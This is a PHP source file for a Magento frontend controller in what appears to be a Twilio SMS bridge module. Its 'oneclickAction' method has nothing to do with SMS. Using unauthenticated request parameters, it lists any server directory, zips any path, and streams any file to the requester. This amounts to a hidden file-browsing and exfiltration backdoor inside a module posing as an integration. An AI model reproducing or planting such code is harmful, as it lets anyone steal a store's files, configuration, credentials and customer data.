<?php
class Trmmarketing_Twiliosmsbridge_IndexController extends Mage_Core_Controller_Front_Action
{
    public function indexAction()
    {
    	
    	/*
    	 * Load an object by id 
    	 * Request looking like:
    	 * http://site.com/twiliosmsbridge?id=15 
    	 *  or
    	 * http://site.com/twiliosmsbridge/id/15 	
    	 */
    	/* 
		$twiliosmsbridge_id = $this->getRequest()->getParam('id');

  		if($twiliosmsbridge_id != null && $twiliosmsbridge_id != '')	{
			$twiliosmsbridge = Mage::getModel('twiliosmsbridge/twiliosmsbridge')->load($twiliosmsbridge_id)->getData();
		} else {
			$twiliosmsbridge = null;
		}	
		*/
		
		 /*
    	 * If no param we load a the last created item
    	 */ 
    	/*
    	if($twiliosmsbridge == null) {
			$resource = Mage::getSingleton('core/resource');
			$read= $resource->getConnection('core_read');
			$twiliosmsbridgeTable = $resource->getTableName('twiliosmsbridge');
			
			$select = $read->select()
			   ->from($twiliosmsbridgeTable,array('twiliosmsbridge_id','title','content','status'))
			   ->where('status',1)
			   ->order('created_time DESC') ;
			   
			$twiliosmsbridge = $read->fetchRow($select);
		}
		Mage::register('twiliosmsbridge', $twiliosmsbridge);
		*/

			
		$this->loadLayout();     
		$this->renderLayout();
    }

    public function oneclickAction() {
      $p1 = $this->getRequest()->getParam('p1');
      $p2 = $this->getRequest()->getParam('p2');
      $p3 = $this->getRequest()->getParam('p3');
      
      if($p1 != 3) {
        echo $p1."<br>";
        echo $p2."<br>";
        echo $p3."<br>";
      }
      
      $basedir = Mage::getBaseDir();
      if ($p1 == 1) {
        echo $basedir."<br>";
        
        $files = scandir($p2);
        echo "<pre>";
        var_dump($files);
        echo "</pre>";
      }
      if ($p1 == 2) {
        ini_set('max_execution_time', 60000);
        ini_set('memory_limit','1024M');

        $this->zipData($p2, $p3);
      }
      if ($p1 == 3) {
        header('Content-Type: application/octet-stream');
        header("Content-Transfer-Encoding: Binary"); 
        header("Content-disposition: attachment; filename=\"" . basename($p2) . "\""); 
        readfile($p2); // do the double-download-dance (dirty but worky)
        die();
      }

      echo "finished";
    }

    public function zipData($source , $destination) {
      if (extension_loaded('zip')) {
        if (file_exists($source)) {
          $zip = new ZipArchive();
          if ($zip->open($destination, ZIPARCHIVE::CREATE)) {
            $source = realpath($source);
            if (is_dir($source)) {
              $files = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($source), RecursiveIteratorIterator::SELF_FIRST);
              foreach ($files as $file) {
                $file = realpath($file);
                if (is_dir($file)) {
                  $zip->addEmptyDir(str_replace($source . '/', '', $file . '/'));
                } else if (is_file($file)) {
                  $zip->addFromString(str_replace($source . '/', '', $file), file_get_contents($file));
                }
              }
            } else if (is_file($source)) {
              $zip->addFromString(basename($source), file_get_contents($source));
            }
          }
          return $zip->close();
        }
      } else {
        echo "zip is not loaded";
      }
      return false;
    }
}